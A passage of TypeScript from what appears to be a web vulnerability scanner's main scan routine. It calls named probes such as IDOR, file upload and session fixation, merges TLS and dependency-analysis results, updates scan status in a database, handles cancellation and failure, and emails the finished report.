          probeActiveOpenRedirect(renderedHtml, normalizedUrl, discoveredParamUrls),
          probeIDORWithDualToken(normalizedUrl, jsBundleEndpoints, session),
        ]);

        // New vulnerability detection probes (run on first page only, regardless of URL matching)
        if (controller.signal.aborted) throw new Error("scan_cancelled");
        if (visitedUrls.size === 1) {
          log(`🔬  Running new vulnerability detection probes (File Upload, Mass Assignment, Business Logic, Password Policy, Subdomains, Session Fixation)...`);
          const fileUploadFindings = await probeFileUploadVulnerabilities(targetUrl, renderedHtml);
          const massAssignmentFindings = await probeMassAssignment(targetUrl, jsBundleEndpoints, session);
          const businessLogicFindings = await probeBusinessLogicVulnerabilities(targetUrl, session);
          const passwordPolicyFinding = await probePasswordPolicy(targetUrl, session);
          const subdomainFinding = await probeCommonSubdomains(targetUrl);
          const sessionFixationFinding = await probeSessionFixationRegeneration(targetUrl, session);

          findings.push(...fileUploadFindings, ...massAssignmentFindings, ...businessLogicFindings);
          if (passwordPolicyFinding) findings.push(passwordPolicyFinding);
          if (subdomainFinding) findings.push(subdomainFinding);
          if (sessionFixationFinding) findings.push(sessionFixationFinding);
        }
        for (const result of infraResults) {
          if (result) findings.push(result);
        }
      }
    }

    // Run SCA (Software Composition Analysis) at the end
    log(`🌐  Running Software Composition Analysis...`);
    const scaFindings = await probeSoftwareCompositionAnalysis(targetUrl);
    for (const result of scaFindings) {
      if (result) findings.push(result);
    }
    // Merge TLS results (were launched in parallel since Phase 0c)
    try {
      const tlsFindings = await tlsPromise;
      for (const tf of tlsFindings) findings.push(tf);
      log(`🔒  Phase 0c complete — ${tlsFindings.length} TLS/SSL finding(s) merged.`);
    } catch (tlsErr) {
      log(`⚠️   TLS probe error: ${tlsErr instanceof Error ? tlsErr.message : String(tlsErr)}`);
    }

    // ══════════════════════════════════════════════════════════════════════
    // ANALYZING PHASE – Awaiting Background AI Reports
    // ══════════════════════════════════════════════════════════════════════
    if (backgroundAiPromises.length > 0) {
      await prisma.scan.update({ where: { id: scanId }, data: { status: "ANALYZING" } });
      log(`📊  Awaiting ${backgroundAiPromises.length} background AI remediation report(s) to finish...`);
      await Promise.allSettled(backgroundAiPromises);
    }

    // Determine final status: COMPLETED vs user-cancelled
    const wasCancelled = controller.signal.aborted;
    const finalStatus = wasCancelled ? "FAILED" : "COMPLETED";

    const updatedScan = await prisma.scan.update({
      where: { id: scanId },
      data: { status: finalStatus, completedAt: new Date() },
    });

    if (wasCancelled) {
      log(`🛑  Scan stopped by user — ${findings.length} finding(s) saved before cancellation.`);
    } else {
      log(`🎉  Scan complete — ${findings.length} finding(s) saved with AI remediation reports!`);
    }
    log(`📋  View results in the Audits Dashboard. Export JSON available on the findings screen.`);
    cleanupScan(scanId);
    await destroyBrowser(scanId);
    cleanupScanController(scanId);

    if (updatedScan.email) {
      log(`📨  Sending JSON report to ${updatedScan.email}...`);
      sendScanReportEmail(scanId, updatedScan.email).catch((e) => {
        console.error("Failed to send report email:", e);
      });
    }
  } catch (scanErr) {
    const isCancelled = controller.signal.aborted || (scanErr instanceof Error && scanErr.message === "scan_cancelled");
    if (isCancelled) {
      log(`🛑  Scan stopped by user — ${findings.length} finding(s) saved before cancellation.`);
      cleanupScan(scanId);
      cleanupScanController(scanId);
      await destroyBrowser(scanId);
      try {
        const updatedScan = await prisma.scan.update({
          where: { id: scanId },
          data: { status: "FAILED", completedAt: new Date() }
        });
        if (updatedScan.email) {
          log(`📨  Sending cancellation notification email to ${updatedScan.email}...`);
          sendScanReportEmail(scanId, updatedScan.email).catch((e) => {
            console.error("Failed to send report email after cancellation:", e);
          });
        }
      } catch (e) {
        console.error("Failed to set FAILED status on cancellation:", e);
      }
      return;
    }

    console.error(`❌ Scan [${scanId}] failed:`, scanErr);
    let errorMsg = "An unexpected error occurred.";
    if (scanErr instanceof Error) {
      errorMsg = scanErr.message;
    } else if (typeof scanErr === "object" && scanErr !== null) {
      errorMsg = (scanErr as any).message || JSON.stringify(scanErr);
    } else if (scanErr) {
      errorMsg = String(scanErr);
    }
    log(`❌  Scan failed: ${errorMsg}`);
    cleanupScan(scanId);
    cleanupScanController(scanId);
    try {
      const updatedScan = await prisma.scan.update({
        where: { id: scanId },
        data: { status: "FAILED" }
      });
      if (updatedScan.email) {
        log(`📨  Sending failure notification email to ${updatedScan.email}...`);
        sendScanReportEmail(scanId, updatedScan.email).catch((e) => {
          console.error("Failed to send report email after failure:", e);
        });
      }
    } catch (e) {
      console.error("Failed to set FAILED status:", e);
    }
  }
}
